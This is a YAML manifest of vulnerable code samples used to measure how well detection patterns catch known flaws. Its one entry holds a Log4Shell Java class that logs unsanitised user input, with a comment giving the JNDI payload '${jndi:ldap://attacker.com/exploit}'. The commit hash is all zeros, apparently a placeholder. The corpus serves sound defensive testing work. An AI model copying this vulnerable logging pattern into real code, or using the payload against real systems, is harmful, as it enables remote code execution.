# Positive corpus manifest — vulnerable code samples used to compute TPR.
#
# Each entry is a real, well-documented vulnerability pattern with the
# vulnerable code embedded as `code_sample`. The build process serialises
# the code into the tarball as entries/{id}/sample.{ext} and the validator
# runs candidate patterns against these files in fresh subshells.
#
# Sources are limited to public datasets:
#   - cve-public-pocs: PoC repos referenced from CVE record references
#   - osv-pocs: PoC repos referenced from OSV.dev advisories
#   - exploit-db: Offensive Security's public exploits archive
#
# Adding new entries: pin to a real public source (or use literal-code
# entries for well-known patterns), include the vulnerable code as
# code_sample, update the sha256 to match the SHA-256 of the code_sample
# text. Validation will run grep/rg/find patterns against this code.

corpus_version: 1.1.0
schema_version: 2

entries:
  - id: log4shell-jndi-lookup
    source: cve-public-pocs
    upstream: https://github.com/kozmer/log4j-shell-poc
    commit: "0000000000000000000000000000000000000000"
    file_path: VulnerableApp.java
    vuln_class: rce
    language: java
    framework: log4j
    cve: CVE-2021-44228
    description: "Log4Shell — log4j JNDI lookup in user-controlled string allows remote code execution"
    license: MIT
    code_sample: |
      import org.apache.logging.log4j.LogManager;
      import org.apache.logging.log4j.Logger;

      public class VulnerableApp {
          private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

          public void handleRequest(String userInput) {
              // VULNERABLE: user-controlled input passed directly to log4j
              // log4j 2.x evaluates ${jndi:ldap://...} substitutions in messages
              logger.info("User requested: " + userInput);

              // Exploit payload would be: ${jndi:ldap://attacker.com/exploit}
              // log4j fetches the remote class and executes it
          }
      }

